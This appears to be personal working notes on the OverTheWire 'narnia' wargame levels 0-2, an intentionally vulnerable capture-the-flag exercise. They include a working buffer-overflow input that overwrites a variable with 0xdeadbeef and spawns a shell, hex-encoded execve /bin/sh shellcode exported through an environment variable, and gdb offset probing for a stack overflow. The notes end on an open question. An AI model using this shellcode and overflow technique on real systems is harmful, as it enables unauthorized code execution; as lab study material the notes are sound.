Given program narnia0
Overflows 4 chars into var after 20 characters have been entered
Need to write “deadbeef” (hex) in ascii.
No normal characters can accomplish this
q=$(echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde")
echo $q | ./narnia0
Works but exits immediately
(python -c 'print "a"*20+"\xef\xbe\xad\xde"'; cat) | ./narnia0
Use cat to persist shell

Source code requires env variable “EGG” be set
Program executes whatever is in egg
EGG=ls
export EGG
Seg fault
Try something else, after research I need shellcode
export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`

Def a buffer overflow problem
Seg fault at “A”*150
Put into gdb
run $(python -c ‘print “A”*150’)
Seg at 0x41414141
run $(python -c ‘print “A”*140’)
Seg at 0x41414141
run $(python -c ‘print “A”*135’)
Seg at 0x00414141
Ok here we go
Need to find shellcode to use, could use above shellcode
How to insert into code and find callback address?
